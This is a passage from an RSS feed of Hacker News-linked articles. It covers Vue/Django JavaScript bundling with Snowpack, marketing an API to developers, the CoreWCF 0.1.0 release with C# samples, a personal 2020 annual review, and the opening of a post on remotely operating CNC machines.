<p>With the advent of the <a href="https://www.snowpack.dev/">Snowpack</a> bundler we can get all the benefits of the <a href="#concatenated-bundling">concatenated bundling</a> approach while eliminating the need to manage JS dependencies manually, at the cost of a slightly-more-complex deployment process.</p>

<p>With import-traced bundling, you write a root JavaScript file for each page that uses regular <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/import">JavaScript import statements</a> to bring in related modules. Your HTML template then only needs to include the root JavaScript file:<br clear="both"></p>

<pre><code>&lt;!-- todo/templates/todo/todo.html --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;...&lt;/head&gt;
&lt;body&gt;...&lt;/body&gt;
&lt;!-- js --&gt;
    &lt;script type="module"&gt;
        import { setupTodoPage } from "{% static 'todo/todo.js' %}";
        setupTodoPage();
    &lt;/script&gt;
&lt;!-- endjs --&gt;
&lt;/html&gt;
</code></pre>


<p>The root JavaScript file might look like:</p>

<pre><code>// static/todo/todo.js
import { defineTodoList } from "./todo/list.js";

export function setupTodoPage() {
    defineTodoList();
    ...
}
</code></pre>


<p>And that root JS file can include other modules like:</p>

<pre><code>// static/todo/list.js
import { defineTodoItem } from "./item.js";

export function defineTodoList() {
    defineTodoItem();
    
    Vue.component('todo-list', {
        props: {
            ...
        },
        template: `
            ...
        `,
        methods: {
            ...
        }
    });
}
</code></pre>


<p>Some key differences between import-traced bundling and concatenated bundling:</p>

<ul>
<li>The HTML page only needs to include the root JS file for the page and not any of its indirect JS dependencies.</li>
<li>JS modules must use <code>import</code> to declare other JS modules that they depend on, and <code>export</code> any functions that they want to be importable by other modules.</li>
<li>JS files for <em>all</em> Django apps in the Django project should be put in a common <code>static</code> directory rather than using per-app <code>static</code> directories. Having a common directory for all JS files will make it easier to configure Snowpack to build combined JS bundles for production deployments.</li>
<li>There is no longer a need to use Django Compressor.</li>
</ul>


<p>For a production deployment, you‚Äôll need to alter your deployment script to run Snowpack on the root <code>static</code> directory for the Django project, enumerating the set of root JS files, and generating same-named files for deployment to your static asset server.</p>

<p>Pros of import-traced bundling:</p>

<ul>
<li><strong>Easy to setup for development.</strong> (Trickier to setup for deployment.)</li>
<li><strong>Zero bundle build times during development.</strong></li>
<li>Fast bundle build times during deployment.</li>
<li><strong>JS dependencies are automatically managed</strong> through regular <code>import</code> statements in JS.</li>
</ul>


<p>Cons of import-traced bundling:</p>

<ul>
<li>JavaScript files are not transpiled at <em>development time</em> (although they <em>are</em> at deployment time), so if you want to use the most bleeding-edge JavaScript features that aren‚Äôt even supported by your development browser then you‚Äôre out of luck. If you need transpilation during development consider the <a href="#transpiled-bundling">transpiled</a> or the <a href="#2-server-approach">2-server</a> approaches instead.</li>
<li>Requires that your development browsers <a href="https://caniuse.com/mdn-javascript_statements_import">support JavaScript import</a> and JS modules in general.</li>
</ul>




<h3>Transpiled Bundling</h3>

<p><a href="https://dafoster.net/assets/2021/vue-and-django/bundling-strategies/transpiled.svg">
    <img alt="Diagram: Transpiled Bundling Strategy" src="https://dafoster.net/assets/2021/vue-and-django/bundling-strategies/transpiled.svg">
</a></p>

<p>If you want the latest and greatest JavaScript features that haven‚Äôt made it even to your latest <em>development</em> browser (ex: the latest Chrome or Firefox) then you‚Äôll need to pay the cost of needing to transpile during development ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dafoster.net/articles/2021/02/16/building-web-apps-with-vue-and-django-the-ultimate-guide/">https://dafoster.net/articles/2021/02/16/building-web-apps-with-vue-and-django-the-ultimate-guide/</a></em></p>]]>
            </description>
            <link>https://dafoster.net/articles/2021/02/16/building-web-apps-with-vue-and-django-the-ultimate-guide/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26194584</guid>
            <pubDate>Fri, 19 Feb 2021 16:10:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Market to Developers Where Developers Are]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26194383">thread link</a>) | @gbourne
<br/>
February 19, 2021 | https://www.ayrshare.com/market-to-developers-where-developers-are-to-boost-leads/ | <a href="https://web.archive.org/web/*/https://www.ayrshare.com/market-to-developers-where-developers-are-to-boost-leads/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-node="5f340663d99e7">
<div>
<h2>Docs, Problems, and Packages Can Boost Your Lead Generation Efforts By 30%</h2>

<p>When we began building our SaaS product Ayrshare, an API that connects to social networks for posting, we strongly felt that we would not be able to tap into our core target market if we only focused on the traditional marketing route. You know, the same Google ads, general SEO, and blog posts.</p>
<p>Ads, SEO, and ‚ÄúTop 10‚Äù posts<sup>*</sup> have a place in every marketing strategy, but we are developers ourselves. We know how important it is for a developer to research and evaluate a new product. And like most developers, we also usually skip over the fluffy marketing pages and go right to the technical meat.</p>
<p>If you have a SaaS product, API, platform, or tool that is primarily used by developers, then you need to take a different approach to target those developers. Whether or not they have direct purchasing power, they are your users, often are hugely influential in the purchasing decision, and where you need to direct your attention.</p>
<p>So how do you effectively market to this technical audience?</p>
<p>Look at where developers spend their time:</p>
<ul><li>Reading documentation</li><li>Looking for solutions to their programming problems</li><li>Evaluating tools and downloading packages</li></ul>
<p><em>*We admittedly have some</em> <em>‚ÄúTop 10‚Äù posts</em></p>
<h2>Docs</h2>
<p>Documentation is one of the most powerful marketing tools at your disposal. Forget your marketing homepage, fancy images, or business-world cliches. Developers want the nitty-gritty details and those can be found in your documents. API, tech specs, and integration docs are what they are looking for and what will ultimately win them over.</p>
<p>For example, in our <a href="http://docs.ayrshare.com/">API Docs</a> we get as technically detailed as possible on how the system works, features and capabilities, and what the integration effort takes. And since we know that these docs will be read by prospective customers, we write them in such a way that puts the reader at ease since we have already thought through many of the technical questions.</p>
<p>So what makes good docs? Think of what you would like to see: integration guides, code examples in multiple languages, API details, and technical FAQs. If you take the time and care in your docs, it can be your biggest selling opportunity. </p>
<p>Stripe has some great API Docs:</p>
<figure><img loading="lazy" width="1024" height="737" src="https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.28.59-AM-1024x737.jpg" alt="" srcset="https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.28.59-AM-1024x737.jpg 1024w, https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.28.59-AM-300x216.jpg 300w, https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.28.59-AM-768x553.jpg 768w, https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.28.59-AM.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px" data-srcset="https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.28.59-AM-1024x737.jpg 1024w, https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.28.59-AM-300x216.jpg 300w, https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.28.59-AM-768x553.jpg 768w, https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.28.59-AM.jpg 1200w" data-src="https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.28.59-AM-1024x737.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><figcaption>Stripe API Docs</figcaption></figure>
<p>If you stop reading now and just focus on amazing docs, you‚Äôll be good to go.</p>
<h2>Solutions to Problems</h2>
<p>If you program and need help, what sites do you visit? I bet <a href="https://stackoverflow.com/">StackOverflow</a> is at the top of the list.</p>
<p>Now, you should never, ever, and I mean never, post promotional info about your app on StackOverflow. In fact, I recommend never mentioning it. </p>
<p>What you should do is help people with questions in your area of expertise, especially if that topic relates to your business. For example if you had a Stripe-like product, answer every question you can on StackOverflow on payments, API calls, and credit card processing.</p>
<figure><img loading="lazy" width="1024" height="737" src="https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.21.04-AM-1024x737.jpg" alt="" srcset="https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.21.04-AM-1024x737.jpg 1024w, https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.21.04-AM-300x216.jpg 300w, https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.21.04-AM-768x553.jpg 768w, https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.21.04-AM.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px" data-srcset="https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.21.04-AM-1024x737.jpg 1024w, https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.21.04-AM-300x216.jpg 300w, https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.21.04-AM-768x553.jpg 768w, https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.21.04-AM.jpg 1200w" data-src="https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.21.04-AM-1024x737.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><figcaption>stackoverflow.com</figcaption></figure>
<p>If you build up a reputation in that area, developers will look to you and your business for help.</p>

<h2>Packages &amp; Modules</h2>
<p>My choice of tech stacks is React and Node.js, so whenever I need to solve a problem, I head over to <a href="https://npm.org/">NPM</a>, Node Package Manager, to see if someone has already built a solution. The same goes when I delve into Python, I go to <a href="https://pypi.org/">PyPI</a>. The breath of packages you can find is amazing and will save you hours of work and maintenance.</p>
<p>Having your own package available in these directories can be a fantastic way for developers to discover your product. You‚Äôll also understand what languages your users build in. For example, we got several requests for a PHP package because potential users saw our package, but didn‚Äôt see a PHP one.</p>
<p>How much of a difference can these packages make? About 30% of our traffic comes from our <a href="https://www.npmjs.com/package/social-post-api">NPM</a> and <a href="https://pypi.org/project/social-post-api/">Python</a> packages or <a href="https://www.ayrshare.com/integration-with-bubble/">Bubble.io</a> or <a href="https://www.ayrshare.com/integration-with-airtable/">Airtable</a> Plugin (no-code tools).</p>
<figure><img loading="lazy" width="1024" height="737" src="https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.22.32-AM-1024x737.jpg" alt="" srcset="https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.22.32-AM-1024x737.jpg 1024w, https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.22.32-AM-300x216.jpg 300w, https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.22.32-AM-768x553.jpg 768w, https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.22.32-AM.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px" data-srcset="https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.22.32-AM-1024x737.jpg 1024w, https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.22.32-AM-300x216.jpg 300w, https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.22.32-AM-768x553.jpg 768w, https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.22.32-AM.jpg 1200w" data-src="https://www.ayrshare.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-12-at-11.22.32-AM-1024x737.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><figcaption>NPM.org</figcaption></figure>
<p>And beyond just marketing, packages give your users the tools they need to more easily integrate your product, making happy users.</p>
<h2>Food For Thought</h2>
<p>Of course these aren‚Äôt the only avenues for reaching your technical users, and likely there are unique ones for your business. However, this should give you some food-for-thought on different marketing opportunities.</p>
</div>
</div></div>]]>
            </description>
            <link>https://www.ayrshare.com/market-to-developers-where-developers-are-to-boost-leads/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26194383</guid>
            <pubDate>Fri, 19 Feb 2021 15:51:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CoreWCF 0.1.0 GA Release]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26194221">thread link</a>) | @pjmlp
<br/>
February 19, 2021 | https://corewcf.github.io/blog/2021/02/19/corewcf-ga-release | <a href="https://web.archive.org/web/*/https://corewcf.github.io/blog/2021/02/19/corewcf-ga-release">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>After 21 months of public development, CoreWCF has finally reached its first GA release. It‚Äôs been a long path to get here, and thee is still have a long way to go. CoreWCF started off as a prototype internal to Microsoft which was started after a meeting with Scott Hunter. During that meeting Scott said something which has shaped the entire development of CoreWCF. He said that we only want one service host (the concept, not the WCF ServiceHost class) in .NET Core. ASP.NET Core had already been released, which meant there wasn‚Äôt a place for ServiceHost (the WCF class). This made a lot of sense, so I set about building a WCF prototype on top of ASP.NET Core. Eventually a decision was made to release the prototype as a community project under the name CoreWCF. The prototype focused on the developer experience so a lot of the implementation needed some love and attention, and 21 months later, we‚Äôre releasing our first GA release. Along the way, the CoreWCF project caught the attention of the Amazon AWS team and they have been contributing significantly to help make this project a success. It is thanks to the contributions from Amazon AWS that the initial release supports WS-* protocols (WS-Security, WS-SecureConversation), and some token authentication credential types with the TransportWithMessageCredentials security mode. This is a significant step towards supporting WS-Federation to enable moving enterprise WCF services to CoreWCF hosted on a cloud platform.</p>

<p>So what changes happened that took 21 months you might ask? Some fundamental architecture changes to make this project sustainable and cross platform. There have been 2 major themes to the changes. Removing Asynchronous Programming Model (APM) api‚Äôs and code, and removing direct native system calls and IO code.</p>

<p>The APM programming pattern is incredibly fast and squeezes out every last bit of performance, but at the cost of code maintainability and debuggability. WCF uses APM to its limit and the codebase can be hard to work with. Porting the code over as-is would require a large commitment from anyone wanting to contribute anything non-trivial. This also would make it hard for the community to be self-supporting. CoreWCF now uses async/await Task based asynchronous programming throughout. Computers are so much faster today than 10 years ago. For a community owned and supported project maintainability is a high priority than speed, within reason. CoreWCF also switched to a request push pipeline model adopting the ASP.NET Core middleware pattern. This made the code simpler, but required a lot of refactoring and rewriting of pieces of WCF.</p>

<p>The second big change is removing platform specific code and removing IO code. CoreWCF doesn‚Äôt even know what a Socket is and yet supports NetTcp. ASP.NET Core handles all of that for CoreWCF. It just reads and writes to pipes or streams. This means CoreWCF developer time isn‚Äôt spent having to handle writing code for some obscure scenario on a specific platform, it can (mostly) let the ASP.NET Core team worry about that.</p>

<p>All this is to say that supportability and maintainability is a high priority for CoreWCF.</p>

<p>A lot has changed, but a lot is also the same. Where changes have been needed, a concerted effort has been made to make things familiar. To give an example, let‚Äôs look at some code. When creating a self hosted service (console or WPF/WinForms as opposed to IIS hosted) in WCF, you would create a ServiceHost, add a ServiceEndpoint, and open the service:</p>

<figure><pre><code data-lang="csharp"><span>ServiceHost</span> <span>host</span> <span>=</span> <span>new</span> <span>ServiceHost</span><span>(</span><span>typeof</span><span>(</span><span>MyService</span><span>),</span> <span>new</span> <span>Uri</span><span>(</span><span>http</span><span>:</span><span>//localhost/myservice));</span>
<span>host</span><span>.</span><span>AddServiceEndpoint</span><span>(</span><span>typeof</span><span>(</span><span>IMyService</span><span>),</span> <span>new</span> <span>BasicHttpBinding</span><span>(),</span> <span>"/basic"</span><span>);</span>
<span>host</span><span>.</span><span>Open</span><span>();</span></code></pre></figure>

<p>With CoreWCF, there‚Äôs a little more code required due to the configuration model of ASP.NET Core, but the CoreWCF pieces are minimal. Those familiar with ASP.NET Core know that when configuring your host you need to specify a startup class which contains two methods, ConfigureServices and Configure. The ConfigureServices method is where anything needed in the dependency injection (DI) system is added, and any extension methods are called to add support for various frameworks such as MVC. At it‚Äôs simplest, a single method is called to add WCF support.</p>

<figure><pre><code data-lang="csharp"><span>public</span> <span>void</span> <span>ConfigureServices</span><span>(</span><span>IServiceCollection</span> <span>services</span><span>)</span>
<span>{</span>
    <span>services</span><span>.</span><span>AddServiceModelServices</span><span>();</span>
<span>}</span></code></pre></figure>

<p>In the Configure method, things will look a little more familiar. The extension method UseServiceModel(this IApplicationBuilder app) is called with a delegate which configures CoreWCF.</p>

<figure><pre><code data-lang="csharp"><span>public</span> <span>void</span> <span>Configure</span><span>(</span><span>IApplicationBuilder</span> <span>app</span><span>)</span>
<span>{</span>
    <span>app</span><span>.</span><span>UseServiceModel</span><span>(</span><span>builder</span> <span>=&gt;</span>
    <span>{</span>
        <span>builder</span><span>.</span><span>AddService</span><span>&lt;</span><span>MyService</span><span>&gt;();</span>
        <span>builder</span><span>.</span><span>AddServiceEndpoint</span><span>&lt;</span><span>MyService</span><span>,</span> <span>IMyService</span><span>&gt;(</span><span>new</span> <span>BasicHttpBinding</span><span>(),</span> <span>"/basic"</span><span>);</span>
    <span>});</span>
<span>}</span></code></pre></figure>

<p>The AddService<tservice>() method registers that a service for the type TService will be used. The service then needs at least one endpoint added to the builder for that service type. When CoreWCF needs an instance of TService, it will first look in DI to see if there's an implementation available, and if not found, will fall back to creating an instance using reflection the same way that WCF does. If either InstanceContextMode.PerSession or InstanceContextMode.PerCall is used, CoreWCF will request an instance from DI if available each time an instance is needed. It will fall back to the same behavior as WCF if the type is not registered in DI. This allows injecting other dependencies such as loggers into the service instances without having to implement IInstanceContextProvider to do so.</tservice></p>

<p>CoreWCF still supports the System.ServiceModel namespaced contract attributes such as ServiceContract and OperationContract if the WCF Core client nuget package System.ServiceModel.Primitives is referenced. This allows sharing contract assemblies between the client and the server. There is also CoreWCF namespaced versions of these attributes too so a dependency on the WCF Core client nuget package isn‚Äôt needed.</p>

<p>There are multiple resources to find out more and to ask any questions about CoreWCF:</p>
<ul>
  <li>Sample usages of CoreWCF alongside their WCF conterparts are available <a href="https://github.com/CoreWCF/CoreWCF/tree/main/src/Samples">here</a>.</li>
  <li>Discussions are enabled on the CoreWCF repo <a href="https://github.com/CoreWCF/CoreWCF/discussions">here</a>.</li>
  <li>Release roadmap can be found <a href="https://github.com/CoreWCF/CoreWCF/blob/main/Documentation/roadmap.md">here</a></li>
  <li>Feature prioritizing issue where you can vote for what you need is <a href="https://github.com/CoreWCF/CoreWCF/issues/234">here</a></li>
  <li>Monthly community sync-up meeting details can be found <a href="https://github.com/CoreWCF/CoreWCF/wiki/Community-Sync-up-meetings">here</a></li>
  <li>CoreWCF gitter channel can be found <a href="https://gitter.im/CoreWCF/CoreWCF">here</a></li>
</ul>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://corewcf.github.io/blog/2021/02/19/corewcf-ga-release</link>
            <guid isPermaLink="false">hacker-news-small-sites-26194221</guid>
            <pubDate>Fri, 19 Feb 2021 15:35:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Late Annual Review]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26194096">thread link</a>) | @rasulkireev
<br/>
February 19, 2021 | https://rasulkireev.com/2020/ | <a href="https://web.archive.org/web/*/https://rasulkireev.com/2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>I have been postponing publishing this post for a long time now. I have finished reviewing my achievements, goals, and other events of the past year on January 2nd. For some mysterious reason have not published anything.</p><p>I am procrastinating out of fear, probably, but it feels that I can't start doing anything meaningful before I publish this review. So here it goes...</p><p>The goal of this post is to compare the <a href="https://rasulkireev.com/2020-goals/" target="_blank" rel="nofollow noopener noreferrer">goals I had for 2020</a> with the actual results. </p><p>If you enjoy this post you may look at my <a href="https://rasulkireev.com/2019-in-review/" target="_blank" rel="nofollow noopener noreferrer">Annual Review for 2019</a></p><h2 id="become-a-better-data-analyst---great">Become a better Data Analyst - Great</h2><p>This is a goal related to my professional career. I got my first full-time job as a data analyst, and I wanted to become much better at it. This is a vague goal, but I did not know what exactly getting better would mean for me. At the end of the year, I can say that I have become much better. </p><p>I am a much better Python programmer than I was at the start of the year. On top of that, I have learned a lot about processing large data sizes with parallel computing (spark, dask). I was more focused on data engineering, than analysis. I learned how to write Azure ARM templates, to deploy Data Lakes, VMs, and other resources. Given my experience learning Django, I was able to impress my management with a small web app, which has a lot of potential of becoming a real product at my firm. I am now planning to transition to a web dev role.</p><h2 id="learning---good">Learning - Good</h2><p>In my spare time, I have learned a lot of web technologies, such as <a href="https://www.djangoproject.com/" target="_blank" rel="nofollow noopener noreferrer">Django</a>, Javascript, and its children (<a href="https://stimulus.hotwire.dev/" target="_blank" rel="nofollow noopener noreferrer">StimulusJS</a>, <a href="https://vuejs.org/" target="_blank" rel="nofollow noopener noreferrer">Vue</a>, <a href="https://reactjs.org/" target="_blank" rel="nofollow noopener noreferrer">React</a>). I had a lot of other interests at the beginning of the year, like LaTeX, GraphQL, ArcGIS, and other fun things. Unfortunately, I only had the capacity and discipline to learn web dev. </p><p>On the web dev side, I have rebuilt my site with Gridsome, and am very happy with it. My site will be a <a href="https://www.nateliason.com/blog/self-education" target="_blank" rel="nofollow noopener noreferrer">perfect sandbox</a> for my Vue (Javascript) learning. I have also built a small note-taking application for an interview at <a href="https://mailbrew.com/" target="_blank" rel="nofollow noopener noreferrer">Mailbrew</a>. Will continue on that front this year.</p><h2 id="become-the-master-of-my-mind-and-life---bad">Become the master of my mind and life - Bad</h2><p>This was a complete miss, unfortunately. </p><p>At the start of the year I had a <a href="https://rasulkireev.com/dealing-with-mild-depression/" target="_blank" rel="nofollow noopener noreferrer">mild depression</a>. </p><p>At the end of the year, I have gained a lot of weight. My diet consisted of sweets and other junk food. This will be a big goal for 2021.</p><p>Regarding exercise and meditation, I'd say it is also a fail. Even though I did do some exercise and meditation it was not enough to make an impact. This will also transition into next year's goals.</p><h2 id="earn-some-cash-from-a-side-hustle---fail">Earn some cash from a side hustle - Fail</h2><p>$0. This year I'll make it happen!</p><h2 id="become-more-sociable---good">Become more sociable - Good</h2><p>This year I was active on Twitter. I found a few cool people and even managed to talk founders of <a href="https://readwise.io/" target="_blank" rel="nofollow noopener noreferrer">Readwise</a> (<a href="https://tristanh.github.io/" target="_blank" rel="nofollow noopener noreferrer">Tristan Homsi</a> and <a href="https://twitter.com/deadly_onion" target="_blank" rel="nofollow noopener noreferrer">Daniel Doyon</a>) and <a href="https://mailbrew.com/" target="_blank" rel="nofollow noopener noreferrer">Mailbrew</a> (<a href="https://francescodilorenzo.com/" target="_blank" rel="nofollow noopener noreferrer">Francesco Di Lorenzo</a> and <a href="https://fabriziorinaldi.com/" target="_blank" rel="nofollow noopener noreferrer">Fabrizio Rinaldi</a>) through Twitter. This was an insane experience.</p><h2 id="become-a-more-loving-husband---good-ish">Become a more loving husband - Good-ish</h2><p>This is hard to quantif–Ω, but I can say that in general my wife and I had a good year. We had some ups and downs, but the general direction is good.</p><h2 id="write-more-often---ok">Write more often - OK</h2><p>I had a goal of writing 50 posts. The goal was too ambitious. However I did manage to write a couple of posts that resonated with people a bit. <a href="https://rasulkireev.com/emails-to-pocket/" target="_blank" rel="nofollow noopener noreferrer">How to Save Emails to Pocket</a> and <a href="https://rasulkireev.com/managing-django-with-poetry/" target="_blank" rel="nofollow noopener noreferrer">Managing a Django Project with Poetry
</a> are the first that come to mind. </p><p>Additionally, if you consider <a href="https://rasulkireev.com/newsletter/" target="_blank" rel="nofollow noopener noreferrer">a newsletter issue</a> as a post then I might be very close to 50. </p><p>I wish to continue this trend further. I am much more comfortable with putting my thoughts out there.</p><h2 id="start-a-podcast---meh">Start a podcast - Meh</h2><p>I have recorded interviews but did not publish them. Thus, it is a fail. Still a goal for 2021.</p><h2 id="get-out-of-debt---good">Get out of debt - Good</h2><p>Almost done. Will complete in 2021.</p><h2 id="buy-an-existing-company---fail">Buy an existing company - Fail</h2><p>Failed. Migrating to 2021.</p><h2 id="other-achievements">Other achievements</h2><ul><li>Started a Zettelkasten with <a href="https://obsidian.md/" target="_blank" rel="nofollow noopener noreferrer">Obsidian</a></li><li>Read a few fantastic, potentially life-changing books
		- How to Take a Smart Note
		- How to Read a Book
		- Atomic Habits
		- The Pragmatic Programmer
		- Pragmatic Thinking and Learning</li><li>Started newsletter this year<ul><li>sent 22 letters</li><li>got 25 subscribers</li></ul></li></ul><h2 id="other-annual-reviews-i-enjoyed">Other Annual Reviews I enjoyed</h2><ul><li><a href="https://jdnoc.com/2020/" target="_blank" rel="nofollow noopener noreferrer">Jordan O'Connor</a></li><li><a href="https://nesslabs.com/annual-review-2020" target="_blank" rel="nofollow noopener noreferrer">Anne-Laure Le Cunff</a></li><li><a href="https://www.nateliason.com/blog/2020-review" target="_blank" rel="nofollow noopener noreferrer">Nat Eliason</a></li><li><a href="https://perell.com/essay/coolest-things-i-learned-in-2020/" target="_blank" rel="nofollow noopener noreferrer">David Perell</a></li></ul><p>If you have any comments or feednack, please leave them <a href="https://twitter.com/rasulkireev/status/1362784454838738946" target="_blank" rel="nofollow noopener noreferrer">on Twitter</a> or <a href="https://news.ycombinator.com/item?id=26194096" target="_blank" rel="nofollow noopener noreferrer">on HackerNews</a>.</p></div></div>]]>
            </description>
            <link>https://rasulkireev.com/2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26194096</guid>
            <pubDate>Fri, 19 Feb 2021 15:22:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[No-Code Needs Code]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26194078">thread link</a>) | @matteomosca
<br/>
February 19, 2021 | https://71lines.com/no-code-needs-code | <a href="https://web.archive.org/web/*/https://71lines.com/no-code-needs-code">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://71lines.com/no-code-needs-code</link>
            <guid isPermaLink="false">hacker-news-small-sites-26194078</guid>
            <pubDate>Fri, 19 Feb 2021 15:20:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We are starting to operate our CNC machines remotely]]>
            </title>
            <description>
<![CDATA[
Score 119 | Comments 93 (<a href="https://news.ycombinator.com/item?id=26193769">thread link</a>) | @Sharapolas
<br/>
February 19, 2021 | https://1d.works/how-we-started-operating-our-cnc-machines-remotely/ | <a href="https://web.archive.org/web/*/https://1d.works/how-we-started-operating-our-cnc-machines-remotely/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <h2 id="introduction"><strong>Introduction</strong></h2><p>Not only COVID-19 has brought many challenges to our daily lives, but it also has inspired a lot of change in how we work and do things. Some professions transitioned to remote work more easily than others. Factory workers and machine operators have been less lucky in this regard and that also applies to us in our CNC-based micro-factory.</p><p>Allowing more people to work remotely opens up many opportunities for businesses. Not only you can bring talent from anywhere in the world, but also you have more choices where to house the hardware allowing to optimise on cost. Furthermore, reaction times can be reduced if travel to the worksite can be eliminated. Quite a few IT professionals have been doing a good job from spectacular locations and we should strive to let more people experience that.</p><p>Another important aspect of structuring work such that it can be done remotely is that it is the first step to automating it. Local to remote, and remote to autonomous allows for a smoother transition than local to autonomous straight away. In the future, we plan on coupling our remote system to AI so if you‚Äôre interested, make sure to follow us on LinkedIn or Facebook!</p><p><strong>WARNING! </strong>Running machinery unsupervised is dangerous and must be avoided. This article is elaborating on how to operate machines more efficiently with more staff working remote, but does not suggest running machines without supervision or people on-site.</p><h2 id="how-corona-showed-us-an-opportunity"><strong>How Corona showed us an opportunity</strong></h2><p>Before the COVID-19 hit our workflow for a CNC job has been as follows:</p><ol><li>Make CAD/ CAM in the office;</li><li>Finalise CAM in the shop;</li><li>Run CNC jobs in the shop.</li></ol><p>However, during the quarantine at times it has become difficult to proceed this way because of the travel restrictions ( our CNC lab and office are based in different districts and district travel is cumbersome during quarantine ). We took up this challenge and used it as an opportunity to do the first step towards our micro-factory automation by doing more of the shop work remotely.</p><h2 id="the-cnc-lab-problem"><strong>The CNC lab problem</strong></h2><p>Running a CNC job required:</p><ol><li>Prepare the CAD/CAM files;</li><li>Setup the CNC machine for the job;</li><li>Loop: place the material, run the program, take out the cut parts, clean the table</li></ol><p>In our team, a single person has been doing all of these things. However, is it wise to use a skilled designer/ operator to be in charge of moving material and parts? Not really, because those skills could be invested in something with a much better return on investment (ROI).</p><p>Why don‚Äôt we have an unskilled person doing that work? Because CNC jobs are prone to small and costly mistakes, so to ensure high quality and safe operation, that person has to have some skills. Those skills need to either be brought in or be taught and as soon as a person has those skills we are back at having a skilled person doing a large amount of unskilled work.</p><h3 id="iteration-1">Iteration 1</h3><p>Our first step towards a solution was finding an unskilled person to be at the shop while we remote into the PC which controls the CNC machine. This has greatly improved our ROI and created a truly win-win situation because not only we are more efficiently using our time resources, but also created a new job position.</p><p>Still, there were issues to be solved. Coordination was done by phone and in order to operate the machine safely, we had to do multiple repeated questions making sure that it is safe to run the machine. Setup was particularly tricky because misunderstandings led to tool breakage and material waste. Lastly, making sure that the operation is proceeding smoothly was tricky as well since it required experienced evaluation and experience we did not have on-site.</p><h3 id="iteration-2">Iteration 2</h3><p>Having drawn conclusions from iteration 1, we‚Äôve decided to upgrade the CNC lab with a camera for more efficient and higher quality feedback. And it is surprising how much easier work became 